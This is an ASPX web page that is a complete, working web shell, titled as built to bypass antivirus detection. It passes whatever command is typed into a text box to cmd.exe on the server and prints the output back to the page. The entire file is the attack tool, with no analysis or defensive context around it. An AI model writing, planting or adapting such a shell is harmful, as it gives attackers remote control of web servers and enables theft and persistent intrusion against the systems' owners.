<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="C#" runat="server">

void Page_Load(object sender, EventArgs e){
	
}

string myexec (string arg){
	ProcessStartInfo mypsi = new ProcessStartInfo();
	mypsi.FileName = "cmd.exe";

	mypsi.Arguments = "/C "+arg;
	mypsi.RedirectStandardOutput = true;
	mypsi.UseShellExecute = false;
	Process p = Process.Start(mypsi);
	StreamReader stmrdr = p.StandardOutput;

	string s = stmrdr.ReadToEnd();
	stmrdr.Close();
	return s;
}

void mycmdEXE(object sender, System.EventArgs e){
	Response.Write("<pre id='Response'' style='Z-INDEX: 104; POSITION: absolute; TOP: 70px'>");
	Response.Write(Server.HtmlEncode(myexec(txtArg.Text)));
	Response.Write("</pre>");
}

</script>
<HTML>
<HEAD>
<title>ASPX Webshell bypass AV</title>
</HEAD>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT:170px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT:430px; POSITION: absolute; TOP: 20px" runat="server" Text="execute" OnClick="mycmdEXE"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT:10px; POSITION: absolute; TOP: 22px" runat="server">Enter Your Command : </asp:Label><br/><br/>
<hr/>

</form>
</body>
</HTML>
